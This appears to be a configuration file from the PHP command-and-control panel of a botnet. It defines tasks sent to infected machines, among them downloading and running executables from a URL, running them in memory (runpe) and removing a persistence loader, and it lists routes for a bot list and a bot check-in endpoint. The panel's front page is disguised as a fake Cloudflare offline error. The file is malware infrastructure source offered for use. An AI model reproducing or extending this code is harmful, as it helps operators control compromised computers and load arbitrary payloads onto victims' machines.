<?php


$foundPlugins = array();

$task_configuration = array(
    "dande" => array(
        "name" => "Download & Execute",
        "command" => "dande",
        "placeholder" => "http://yourdomainorip.com/path/to/file.exe",
    ),
    "runpe" => array(
        "name" => "Download & Execute in Memory",
        "command" => "runpe",
        "placeholder" => "http://yourdomainorip.com/path/to/file.exe",
    ),
    "update" => array(
        "name" => "Update",
        "command" => "update",
        "placeholder" => "http://yourdomainorip.com/path/to/file.exe",
    ),
    "uninstall" => array(
        "name" => "Uninstall",
        "command" => "uninstall",
    ),
    "killpersistence" => array(
        "name" => "Kill Persistence Loader",
        "command" => "killpersistence",
    )
);

$defaulRoutes = array(
    "FakeErrors@cloudflare_offlinehost" => "/",

    "Main@login" => "/login" ,
    "Main@index" => "/dashboard",
    "Main@tasks" => array("/tasks","/tasks/(\d+)"),
    "Main@logout" => "/logout",
    "Main@settings" => "/settings" ,
    "Main@bots" => "/bots",

    "Main@taskdetails" => "/taskdetails/(\d+)",
    "Main@edituser" => "/edituser/(\d+)",
    "Main@botinfo" => "/botinfo/(\d+)",

    "BotHandler@request" =>"/request",
);